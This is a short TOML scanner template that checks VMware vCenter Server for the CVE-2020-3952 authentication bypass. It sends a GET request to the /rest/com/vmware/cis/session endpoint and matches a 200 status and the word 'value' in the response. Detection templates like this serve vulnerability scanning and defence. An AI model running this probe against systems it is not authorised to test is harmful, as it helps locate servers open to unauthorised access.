[info]
author = "ave"
description = "检测 VMware vCenter Server 身份认证绕过漏洞（CVE-2020-3952），攻击者可通过构造恶意 HTTP 请求绕过认证机制，获取未授权访问权限并可能导致敏感信息泄露"
id = "POC-AVE-2020-1520"
name = "CVE-2020-3952 VMware vCenter Server Authentication Bypass PoC"
severity = "critical"
tags = ["ave-2020-1520"]
vuln_id = [
    "CVE-2020-3952",
    "AVE-2020-1520",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/rest/com/vmware/cis/session"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["value"]
